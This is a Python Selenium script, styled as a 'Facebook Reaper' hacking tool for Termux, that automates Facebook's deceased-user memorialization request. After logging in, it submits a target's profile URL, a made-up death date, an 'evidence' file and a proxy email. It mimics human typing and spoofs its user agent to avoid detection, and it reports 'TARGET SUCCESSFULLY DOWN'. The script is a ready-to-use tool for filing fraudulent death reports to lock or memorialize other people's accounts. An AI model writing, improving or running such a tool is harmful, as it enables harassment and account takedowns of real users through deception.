#!/usr/bin/env python3
# rip.py - HACKER EDITION
# OTF x DJAMAL19

import os, sys, time, random, string
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# ==========================================
# STYLE & BANNIÈRE
# ==========================================
R = "\033[91m" ; G = "\033[92m" ; Y = "\033[93m"
C = "\033[96m" ; W = "\033[97m" ; X = "\033[0m"

def clear(): os.system('clear')

def banner():
    clear()
    print(f"""{G}
 ██████╗ ████████╗███████╗      ██████╗  █████╗ ███╗   ██╗ ██████╗ 
██╔═══██╗╚══██╔══╝██╔════╝     ██╔════╝ ██╔══██╗████╗  ██║██╔════╝ 
██║   ██║   ██║   █████╗       ██║  ███╗███████║██╔██╗ ██║██║  ███╗
██║   ██║   ██║   ██╔══╝       ██║   ██║██╔══██║██║╚██╗██║██║   ██║
╚██████╔╝   ██║   ██╗          ╚██████╔╝██║  ██║██║ ╚████║╚██████╔╝
 ╚═════╝    ╚═╝   ╚═╝           ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝     
      {R}╔═══════════════════════════════════════════╗
      ║    FACEBOOK REAPER • OTF x DJAMAL19       ║
      ║       TARGET ELIMINATION PROTOCOL         ║
      ╚═══════════════════════════════════════════╝{X}
""")

def loading(percent, status=""):
    bar_len = 20
    filled_len = int(round(bar_len * percent / 100))
    bar = f"{G}█{X}" * filled_len + f"{C}░{X}" * (bar_len - filled_len)
    sys.stdout.write(f'\r  {C}[{bar}{C}] {G}{percent}%{X} :: {status}\033[K')
    sys.stdout.flush()

def type_human(element, text):
    time.sleep(random.uniform(0.5, 1.0))
    chars = string.ascii_lowercase + string.digits
    for char in text:
        if random.random() < 0.05:
            try:
                wrong_char = random.choice(chars)
                element.send_keys(wrong_char)
                time.sleep(random.uniform(0.1, 0.3))
                element.send_keys(Keys.BACK_SPACE)
            except: pass
        element.send_keys(char)
        time.sleep(random.uniform(0.05, 0.2))

# ==========================================
# CONFIGURATION
# ==========================================
banner()
if not os.path.exists("/sdcard"): print(f"  {R}[ERROR] STORAGE DENIED.{X}"); exit()

def input_hacker(text):
    sys.stdout.write(f"  {G}root@otf:~/attack# {W}{text} : {C}")
    sys.stdout.flush()
    val = input().strip()
    print(f"{X}", end="")
    return val

print(f"  {Y}[KERNEL] LOADING EXPLOIT MODULES...{X}\n")

URL_PROFIL = input_hacker("TARGET URL")
DATE_INPUT = input_hacker("DEATH DATE (DD/MM/YYYY)")
DATE_DECES = DATE_INPUT if DATE_INPUT else datetime.now().strftime("%d/%m/%Y")
PREUVE_PATH = input_hacker("EVIDENCE PATH").strip('"\'')
EMAIL_TEMP = input_hacker("PROXY EMAIL")

if not os.path.isfile(PREUVE_PATH): print(f"\n  {R}[ERROR] EVIDENCE FILE NOT FOUND.{X}"); exit(1)

banner()
print(f"\n  {Y}[*] INITIALIZING GECKO ENGINE...{X}\n")

# ==========================================
# ENGINE START
# ==========================================
driver = None
try:
    loading(5, "ALLOCATING MEMORY...")
    gecko_path = "/data/data/com.termux/files/usr/bin/geckodriver"
    if not os.path.exists(gecko_path): gecko_path = "/usr/bin/geckodriver"
    
    service = Service(executable_path=gecko_path)
    options = FirefoxOptions()
    options.add_argument("--headless")
    options.set_preference("general.useragent.override", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0")
    
    driver = webdriver.Firefox(service=service, options=options)
    driver.set_window_size(1080, 2400)
    wait = WebDriverWait(driver, 30)

    # BOUCLE LOGIN
    while True:
        sys.stdout.write("\r" + " " * 80 + "\r")
        print(f"\n  {Y}[AUTH] CREDENTIALS REQUIRED{X}")
        EMAIL = input(f"  {C}[USER] Email : {G}").strip()
        PASSWORD = input(f"  {C}[PASS] Pass  : {G}").strip()
        print(f"{X}", end="")

        loading(10, "ESTABLISHING CONNECTION...")
        driver.get("https://www.facebook.com/")
        try:
            time.sleep(2)
            cookie_btns = driver.find_elements(By.XPATH, "//button[contains(text(), 'Autoriser') or contains(text(), 'Accept')]")
            if cookie_btns: cookie_btns[0].click()
        except: pass

        loading(20, "INJECTING CREDENTIALS...")
        try:
            email_field = wait.until(EC.presence_of_element_located((By.NAME, "email")))
            email_field.clear(); type_human(email_field, EMAIL)
            pass_field = driver.find_element(By.NAME, "pass")
            pass_field.clear(); type_human(pass_field, PASSWORD)
            
            loading(35, "BYPASSING GATEWAY...")
            try: driver.find_element(By.NAME, "login").click()
            except: pass_field.send_keys(Keys.ENTER)
        except: pass

        loading(40, "VERIFYING SESSION...")
        time.sleep(5)

        if "login_attempt" in driver.current_url or "incorrect" in driver.page_source.lower():
            print(f"\n\n  {R}[ACCESS DENIED] WRONG CREDENTIALS.{X}"); time.sleep(1); continue
        elif "checkpoint" in driver.current_url or "two_step" in driver.current_url:
            print(f"\n  {R}[!] 2FA TRIGGERED.{X} {W}Validate on phone then press ENTER.{X}")
            input(); break
        else:
            print(f"\n  {G}[ACCESS GRANTED] ROOT ACCESS CONFIRMED.{X}"); break

    # PAYLOAD
    loading(50, "RESOLVING TARGET NODE...")
    driver.get("https://www.facebook.com/help/contact/234739086860192")
    
    loading(60, "INJECTING TARGET ID...")
    try:
        try: url_field = wait.until(EC.presence_of_element_located((By.NAME, "FBUrl")))
        except: url_field = driver.find_element(By.CSS_SELECTOR, "input[type='text']")
        url_field.send_keys(URL_PROFIL)
    except: pass

    loading(70, f"SPOOFING METADATA ({DATE_DECES})...")
    try:
        # Date Fix (Tabulation)
        yyyy, mm, dd = DATE_DECES.split("-") if "-" in DATE_DECES else DATE_DECES.split("/")
        date_fr = f"{dd}/{mm}/{yyyy}"
        
        date_field = None
        try: date_field = driver.find_element(By.CSS_SELECTOR, "input._3smp")
        except:
            inputs = driver.find_elements(By.CSS_SELECTOR, "input[type='text']")
            if len(inputs) >= 2: date_field = inputs[1]
        
        if date_field:
            date_field.click(); time.sleep(0.5)
            date_field.send_keys(date_fr); time.sleep(0.5)
            date_field.send_keys(Keys.TAB) # Validation
    except: pass

    loading(80, "UPLOADING BINARY...")
    try:
        file_input = driver.find_element(By.CSS_SELECTOR, "input[type='file']")
        file_input.send_keys(os.path.abspath(PREUVE_PATH))
    except: pass

    loading(85, "ROUTING PROXY...")
    try:
        try: email_field = driver.find_element(By.NAME, "email")
        except: email_field = driver.find_elements(By.CSS_SELECTOR, "input[type='text']")[-1]
        email_field.send_keys(EMAIL_TEMP)
    except: pass

    loading(90, "EXECUTING FINAL PAYLOAD...")
    time.sleep(2)
    try:
        btn = driver.find_element(By.XPATH, "//button[contains(text(), 'Envoyer') or contains(text(), 'Submit')]")
        btn.click()
    except:
        try: driver.find_element(By.CSS_SELECTOR, "button[type='submit']").click()
        except: pass

    loading(95, "AWAITING CONFIRMATION...")
    time.sleep(6)
    save_path = "/sdcard/TERMUX_PROOF.png"
    driver.save_screenshot(save_path)

    if "merci" in driver.page_source.lower() or "thank" in driver.page_source.lower():
        loading(100, "OPERATION COMPLETED.")
        print(f"\n\n  {G}╔════════════════════════════════════════╗")
        print(f"  ║      ✔ TARGET SUCCESSFULLY DOWN      ║")
        print(f"  ║             OTF x DJAMAL19           ║")
        print(f"  ╚════════════════════════════════════════╝{X}")
    else:
        loading(99, "PACKET SENT.")
        print(f"\n\n  {Y}[!] REQUEST SENT. CHECK PROOF AT: {save_path}{X}")

    input(f"\n  {W}Press Enter to exit kalinux...{X}")

except Exception as e:
    sys.stdout.write("\r" + " " * 80 + "\r")
    print(f"\n  {R}[KERNEL PANIC] {e}{X}")
    if driver: driver.save_screenshot("/sdcard/termux_crash.png")
    input()
finally:
    if driver: driver.quit()
